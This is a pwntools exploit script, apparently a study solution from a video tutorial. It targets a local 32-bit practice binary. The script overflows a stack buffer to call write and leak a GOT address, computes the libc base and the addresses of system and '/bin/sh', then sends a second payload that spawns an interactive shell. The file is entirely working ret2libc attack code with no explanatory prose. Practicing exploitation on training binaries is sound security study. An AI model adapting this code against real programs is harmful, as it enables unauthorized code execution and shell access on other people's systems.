'''
Author: 白银
Date: 2022-09-05 20:48:55
LastEditTime: 2022-09-05 21:23:55
LastEditors: 白银
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=21&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=328.2
'''
from pwn import *

context(log_level = 'debug', arch = 'i386', os = 'linux')

pwnfile = './question_5_x86'
io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc_file_path = b'/lib/i386-linux-gnu/libc.so.6'
libc = ELF(libc_file_path)

padding = 0x14# 地址0x10，长度4
leak_func_name = 'write'
leak_func_got = elf.got[leak_func_name]
return_addr = elf.symbols['dofunc']

write_sym = elf.symbols['write']
payload = flat(['a' * padding, write_sym, return_addr, 1 , leak_func_got, 4])#先溢出栈，再返回地址，最后三个是write的参数
delimiter = 'input:'

io.sendlineafter(delimiter, payload)

io.recvuntil('byebye')
write_addr = u32(io.recv(4))
print('write_addr: ', hex(write_addr))

write_offset = libc.symbols[leak_func_name]
libc_addr = write_addr - write_offset
print('libc_addr: ', hex(libc_addr))

system_offset = libc.symbols['system']
system_addr = libc_addr + system_offset
print('system_addr: ', hex(system_addr))

bin_sh_offset = next(libc.search(b'/bin/sh'))
bin_sh_addr = libc_addr + bin_sh_offset
print('bin_sh_addr: ', hex(bin_sh_addr))

gdb.attach(io)
pause()

payload2 = flat(['a' * padding, system_addr, 0xdeadbeef, bin_sh_addr])

delimiter = 'input:'

io.sendlineafter(delimiter, payload2)

pause()

io.interactive()